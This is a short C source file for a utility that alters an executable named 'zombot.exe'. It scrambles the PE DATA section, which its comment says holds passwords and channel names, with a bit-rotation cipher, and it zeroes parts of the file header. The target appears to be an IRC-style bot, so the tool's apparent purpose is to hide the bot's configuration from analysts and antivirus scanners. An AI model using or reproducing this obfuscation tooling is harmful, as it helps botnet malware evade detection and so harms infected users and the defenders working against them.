
// ZASM: encrypt 1st 4k in the DATA section
// passwords, channel names & other critical info holds there

#include <stdio.h>
#include <stdlib.h>
#include <dos.h>
#include <dir.h>
#include <io.h>
#include <assert.h>
#include <memory.h>
#include <string.h>

#pragma hdrstop

#define targetfile "zombot.exe"
#define datasect   "DATA"

#define ROLD(x)    (((x)<<1)|((x)>>31))
#define ENCR_D(x)  ROLD(x)

void zerofill(char* buf, int start, int len)
{
  printf("þ zerofill at %08X, len=%i\n", start, len);
  memset(&buf[start], 0, len);
}

void main(int argc, char* argv[])
{
  if (argc!=2) return;

  printf("þ reading\n");
  FILE*f=fopen(targetfile,"rb");
  unsigned len=filelength(fileno(f));
  char*buf=(char*)malloc(len);
  fread(buf,1,len,f);
  fclose(f);

  if (!stricmp(argv[1],"1"))
  {

    printf("þ searching\n");
    for (unsigned i=0; i<len; i++)
      if (!strncmp(&buf[i],datasect,strlen(datasect)))
      {
        unsigned long physsize = *(unsigned long*)(&buf[i+0x10]);
        unsigned long physoffs = *(unsigned long*)(&buf[i+0x14]);
        printf("þ encrypting %s at %08X, %i bytes\n", datasect,physoffs, physsize);
        unsigned* bufd = (unsigned*) &buf[physoffs];
        for (unsigned j=0; j<physsize/4; j++)
          bufd[j] = ENCR_D(bufd[j]);
        break;
      }

  } // 1

  if (!stricmp(argv[1],"2"))
  {

    zerofill(buf, 0x40, 0x40);
    zerofill(buf, 0x300, 0x100);

  } // 2

  printf("þ writing\n");
  f=fopen(targetfile,"wb");
  fwrite(buf,1,len,f);
  fclose(f);
}
